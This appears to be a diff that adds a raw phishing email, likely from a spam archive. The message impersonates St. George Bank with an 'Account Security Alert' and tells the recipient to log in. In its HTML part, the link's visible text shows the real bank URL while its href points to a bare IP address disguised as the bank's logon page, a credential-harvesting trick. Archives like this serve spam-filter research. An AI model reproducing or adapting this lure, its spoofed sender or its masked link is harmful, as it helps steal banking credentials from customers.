@@ -1,0 +1,82 @@
+Delivered-To: bruce@untroubled.org
+Received: (fqmail 27110 invoked from network); 06 Mar 2015 23:02:35 -0000
+Received: (qmail 14488 invoked from network); 6 Mar 2015 23:02:35 -0000
+Received: from rip.mx16.futurequest.net (rip.mx16.futurequest.net [10.2.1.192])
+  by mx16.futurequest.net ([69.5.6.192]); 06 Mar 2015 23:02:35 -0000
+Received: from zimbra.mlit.wisc.edu ([144.92.64.134])
+  by rip.mx16.futurequest.net ([10.2.1.192])
+  with ESMTP via TCP; 06 Mar 2015 23:02:35 -0000
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by zimbra.mlit.wisc.edu (Postfix) with ESMTP id 7206663BF8
+	for <bruce@untroubled.org>; Fri,  6 Mar 2015 16:48:24 -0600 (CST)
+X-Virus-Scanned: amavisd-new at zimbra.mlit.wisc.edu
+Received: from zimbra.mlit.wisc.edu ([127.0.0.1])
+	by localhost (zimbra.mlit.wisc.edu [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id kF-j-AQ050XY for <bruce@untroubled.org>;
+	Fri,  6 Mar 2015 16:48:24 -0600 (CST)
+Received: from 78.96.226.244 (unknown [95.76.182.179])
+	by zimbra.mlit.wisc.edu (Postfix) with ESMTPA id BB2E3859BF
+	for <bruce@untroubled.org>; Fri,  6 Mar 2015 16:48:23 -0600 (CST)
+From: "St. George Bank" <service@stgeorge.com.au>
+Subject: Account Security Alert
+To: "bruce" <bruce@untroubled.org>
+Content-Type: multipart/alternative; boundary="rk4vUZl8FpOcYx157ngUPOaRiu=_xhROBX"
+MIME-Version: 1.0
+Date: Sat, 7 Mar 2015 01:02:21 +0200
+Message-Id: <20150306224823.BB2E3859BF@zimbra.mlit.wisc.edu>
+
+This is a multi-part message in MIME format
+
+--rk4vUZl8FpOcYx157ngUPOaRiu=_xhROBX
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
+
+=EF=BB=BF=20
+We recently reviewed your account, and we are suspecting that your acc=
+ount may have been accessed from an unauthorized computer.
+This may be due to changes in your IP address or location.Protecting t=
+he security of your account is our primary concern.
+We asking you to immediately login and report any unauthorised withdra=
+wals, and check your account profile to make sure no changes have been=
+ made.
+Please click on the following link, to update your account:
+https://ibanking.stgeorge.com.au/ibank/loginPage.action
+Please understand that this is a security measure intended to help pro=
+tect you and your account. We apologize for any inconvenience.
+Thank you,
+St.George Bank Customer Service
+
+
+--rk4vUZl8FpOcYx157ngUPOaRiu=_xhROBX
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
+
+=EF=BB=BF<HTML><HEAD><TITLE></TITLE></HEAD>
+<BODY>
+<P style=3D"TEXT-ALIGN: center">&nbsp;</P>
+<P style=3D"TEXT-ALIGN: center">We recently reviewed your account, and=
+ we are suspecting that your account may have been accessed from an un=
+authorized computer.</P>
+<P style=3D"TEXT-ALIGN: center">This may be due to changes in your IP =
+address or location.Protecting the security of your account is our pri=
+mary concern.</P>
+<P style=3D"TEXT-ALIGN: center">We asking you to immediately login and=
+ report any unauthorised withdrawals, and check your account profile t=
+o make sure no changes have been made.</P>
+<P style=3D"TEXT-ALIGN: center">Please click on the following link, to=
+ update your account:</P>
+<P style=3D"TEXT-ALIGN: center"><A href=3D"http://113.171.249.22/https=
+/www.stgeorge.com.au/online-services/internet-banking/logon.html?respo=
+nse_type=3Dcode&amp;client_id=3Dtb5SFf3cRxEyspDN">https://ibanking.stg=
+eorge.com.au/ibank/loginPage.action</A></P>
+<P style=3D"TEXT-ALIGN: center">Please understand that this is a secur=
+ity measure intended to help protect you and your account. We apologiz=
+e for any inconvenience.</P>
+<P style=3D"TEXT-ALIGN: center">Thank you,<BR>St.George Bank Customer =
+Service</P></BODY></HTML>
+
+
+--rk4vUZl8FpOcYx157ngUPOaRiu=_xhROBX--
+
